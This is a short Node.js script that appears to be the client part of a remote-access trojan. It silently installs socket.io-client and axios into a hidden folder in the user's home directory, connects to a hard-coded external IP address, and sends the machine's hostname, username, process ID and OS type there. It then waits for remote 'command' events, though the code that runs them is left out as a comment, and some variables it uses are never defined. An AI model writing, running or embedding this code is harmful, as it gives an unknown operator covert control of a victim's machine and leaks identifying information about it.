(async () => {
  const os = require("os"),
    path = require("path"),
    fs = require("fs"),
    cp = require("child_process");
  const homeMods = path.join(os.homedir(), ".node_modules");
  module.paths.push(path.join(homeMods, "node_modules"));

  // Silent dependency install
  await exec('npm install axios socket.io-client --prefix "' + homeMods + '"');

  const axios = require("axios");
  const io = require("socket.io-client");
  const socket = io("http://85.239.62.36:3306");

  socket.on("connect", () => {
    socket.emit("identify", "client", {
      clientUuid: hostname + "$" + username,
      processId: process.pid,
      osType: os.type(),
    });
  });

  socket.on("command", (cmd, uuid) => {
    /* command parsing + exec logic */
  });
})();
